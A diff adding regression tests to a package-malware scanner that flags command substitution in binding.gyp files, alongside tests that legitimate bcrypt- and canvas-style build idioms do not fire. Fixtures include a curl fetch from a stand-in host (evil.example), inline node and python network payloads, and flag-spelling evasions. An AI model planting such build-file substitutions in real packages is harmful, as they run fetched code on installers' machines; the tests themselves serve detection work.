@@ -105,6 +105,142 @@ async function runPackageTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  // --- Phantom Gyp: binding.gyp command-substitution (install-time exec w/o lifecycle) ---
+
+  await asyncTest('PACKAGE: binding.gyp <!(...) command-substitution → gyp_command_exec CRITICAL (no lifecycle)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'phantom-gyp-pkg', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(x => x.type === 'gyp_command_exec');
+      assert(t, 'Should detect gyp_command_exec on <!(...) with NO package.json lifecycle script');
+      assert(t.severity === 'CRITICAL', 'gyp_command_exec should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: binding.gyp <!@(...) command-substitution → gyp_command_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'gyp-at-pkg', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!@(curl -s http://evil.example/p)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'), 'Should detect gyp_command_exec on <!@(...)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: legit native addon (variable-expansion + pkg-config) → NO gyp_command_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'legit-addon', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "sources": ["src/addon.cc"], "include_dirs": ["<(module_root_dir)/include"], "cflags": ["<!(pkg-config --cflags glib-2.0)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'Variable-expansion <(...) and the pkg-config build-tool idiom must NOT trigger gyp_command_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: build-tool with || fallback → NO gyp_command_exec (single-| FP regression)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-fallback', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "addon", "cflags": ["<!(pkg-config --cflags glib-2.0 || echo default)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A legit build-tool command with a ||/&& shell fallback must NOT fire (this was the single-| false positive)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: pkg-config || curl <payload> → gyp_command_exec (danger marker behind ||)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-evil-fallback', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!(pkg-config --cflags x || curl http://evil.example/p)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A network fetch (curl) chained behind a build tool via || must still fire (danger marker)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // FPR regressions from the real-package gate: the exact legit idioms bcrypt/canvas use via <!(...)
+  // must NOT fire — they carry no malice marker (a build-helper script == a payload, statically).
+  await asyncTest('PACKAGE: bcrypt-style node -p build query → NO gyp_command_exec (FPR gate)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-bcrypt-like', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "bcrypt_lib", "defines": ["NODE_MAJOR=<!(node -p process.versions.node)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A node -p build-value query (bcrypt idiom) must NOT fire — no malice marker');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: canvas-style node helper + pkg-config|sed → NO gyp_command_exec (FPR gate)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-canvas-like', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "canvas", "libraries": ["<!(node ./util/has_lib.js jpeg)"], "include_dirs": ["<!(pkg-config cairo --cflags-only-I | sed s/-I//g)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A local build-helper script (node ./util/has_lib.js) and pkg-config|sed (canvas idioms) must NOT fire');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: node -e require(https) payload → gyp_command_exec (inline interpreter + network)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-inline-https', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!(node -e require(\'https\').get(0))"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'),
+        'node -e reaching the network (require https) at configure time must fire (inline interpreter payload)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: python3 -c urllib payload → gyp_command_exec (inline interpreter + network)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-inline-py', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!(python3 -c import urllib.request)"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'),
+        'python3 -c importing urllib at configure time must fire (inline interpreter payload)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: node -e execSync(gcc) toolchain probe → NO gyp_command_exec (FPR: legit shell-out)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-toolchain', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "defines": ["GCC=<!(node -e require(\'child_process\').execSync(\'gcc --version\'))"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!result.threats.find(x => x.type === 'gyp_command_exec'),
+        'A legit toolchain probe via child_process.execSync must NOT fire — exec/child_process is intentionally NOT a marker (else FP on real addons)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: node --eval require(node:https) → gyp_command_exec (1-token evasions closed)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gyp-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'addon-evasion', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'binding.gyp'),
+      '{ "targets": [ { "target_name": "x", "sources": ["<!(node --eval require(\'node:https\').get(0))"] } ] }');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result.threats.find(x => x.type === 'gyp_command_exec'),
+        'node --eval (long flag) + require(node:https) (node: prefix) must still fire — the cheap evasions are closed');
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- No package.json ---
 
   await asyncTest('PACKAGE: Returns empty threats for missing package.json', async () => {
